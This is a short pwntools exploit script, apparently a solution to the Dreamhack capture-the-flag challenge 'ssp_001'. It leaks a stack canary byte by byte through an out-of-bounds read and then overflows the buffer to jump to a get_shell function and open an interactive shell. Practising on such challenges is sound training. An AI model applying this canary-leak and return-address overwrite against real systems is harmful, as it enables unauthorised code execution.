from pwn import *

context = "i386"
p = remote("host3.dreamhack.games", 17338)

elf = ELF("./ssp_001")
get_shell = elf.symbols['get_shell']

# get_shell = b'\xb9\x86\x04\x08'

canary = b'\x00'
#for i in range(129, 132): 
#    p.sendline(b'P')
#    p.sendline(str(i).encode())
#    p.recvuntil(b'is : ')
#    canary += p8(int(p.recv(2),16))

p.sendline(b'P')
p.sendline(b'129')
p.recvuntil(b'is : ')
canary += p32(int(p.recv(2), 16))[:1]

p.sendline(b'P')
p.sendline(b'130')
p.recvuntil(b'is : ')
canary += p32(int(p.recv(2), 16))[:1]

p.sendline(b'P')
p.sendline(b'131')
p.recvuntil(b'is : ')
canary += p32(int(p.recv(2), 16))[:1]

p.sendline(b'E')
p.sendline(b'80')

payload = b'a'*64 + canary + b'a'*8 + p32(get_shell)
p.send(payload)

p.interactive()
